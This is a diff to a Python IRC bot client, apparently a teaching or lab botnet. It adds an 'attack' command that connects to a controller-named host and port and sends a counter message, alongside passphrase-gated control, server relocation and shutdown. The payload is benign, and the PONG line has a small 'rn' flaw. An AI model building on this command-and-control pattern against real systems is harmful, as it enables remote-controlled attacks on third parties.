@@ -15,10 +15,12 @@ class botClient:
         self.port = port
         self.channel = "#" + channel
         self.secret_phrase = secret_phrase
+        #TODO figure out a way to assign unique usernames to bots
         self.bot_nick = "robotnik"
         self.irc_socket = None
         self.controller = None
         self.controller_nick = None
+        self.attack_counter = 0
 
     def start_client(self):
         connected = self.__attempt_connection()
@@ -64,7 +66,7 @@ class botClient:
 
     # Function to check for the secret passphrase
     def check_msg(self, text):
-        # TODO add check for NICK
+        # TODO add check for NICK --> for if controller changes nickname
         if (not "PRIVMSG" in text) or (not self.channel in text):
             return False
 
@@ -91,11 +93,21 @@ class botClient:
         else:
             return False
 
+    # Code adapted from: https://pythonspot.com/en/building-an-irc-bot/
+    def get_text(self):
+        text = self.recv_msg() #receive the text
+        if text.find('PING') != -1:
+            self.send_msg('PONG ' + text.split()[1] + 'rn')
+        return text
+
     # function to receive and execute the command sent by the controller
     def receive_command(self, command):
         # TODO add function call for each command
         if command.startswith("attack"):
-            pass
+            command = command.split()
+            if len(command) != 3:
+                return
+            self.__attack(command[1], command[2])
         elif command.startswith("move"):
             command = command.split()
             if len(command) != 4:
@@ -107,13 +119,7 @@ class botClient:
         elif command == "shutdown":
             self.__shutdown()
 
-    # Code adapted from: https://pythonspot.com/en/building-an-irc-bot/
-    def get_text(self):
-        text = self.recv_msg() #receive the text
-        if text.find('PING') != -1:
-            self.send_msg('PONG ' + text.split()[1] + 'rn')
-        return text
-
+    # moves the bot to the specified host
     def __move(self, host, port, channel):
         if not check_port(port):
             return
@@ -127,10 +133,40 @@ class botClient:
         connected = self.__attempt_connection()
         if not connected:
             self.send_to_user(self.controller_nick, "Move failed")
-            self.__shutdown()
             #TODO maybe reconnect to original server here
+            self.__shutdown()
         return
 
+    # attempts to send the attack message to the target
+    def __attack(self, host, port):
+        self.attack_counter += 1
+        if not check_port(port):
+            return
+        port = int(port)
+        attack_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+        connected = False
+        timeout = 5 # timeout (in seconds)
+        timeout_start = time.time()
+        while not connected and (time.time() < timeout_start + timeout):
+            try:
+                attack_socket.connect((host, port)) # connect to victim
+            except Exception:
+                continue
+            connected = True
+
+        if not connected:
+            self.log("Error: Attack on Host: " + host + \
+                     " on Port: " + str(port) + " timed out.")
+            self.send_to_user(self.controller_nick,
+                              "Attack Failed: Connection Error")
+        else:
+            # send attack message and report success
+            attack_socket.send((str(self.attack_counter) + \
+                               " " + self.bot_nick).encode())
+            self.send_to_user(self.controller_nick, "Attack Successful")
+
+    # sends the bot status to the controller
     def send_status(self):
         self.send_to_user(self.controller_nick, self.bot_nick)
         self.log("Status sent to Controller")
@@ -141,15 +177,18 @@ class botClient:
         self.irc_socket.close()
         sys.exit()
 
-
+    # function for logging messages
     def log(self, message):
         print(message.strip("\n") + "\n")
 
+    # functions to send/recv raw messages from IRC server
     def send_msg(self, message):
         self.irc_socket.send(message.encode())
+
     def recv_msg(self):
         return self.irc_socket.recv(2040).decode()  #receive the text
 
+    # functions to send/recv messages to channel
     def send_to_channel(self, message):
         self.send_msg("PRIVMSG " + self.channel + " :" + message + "\n")
 
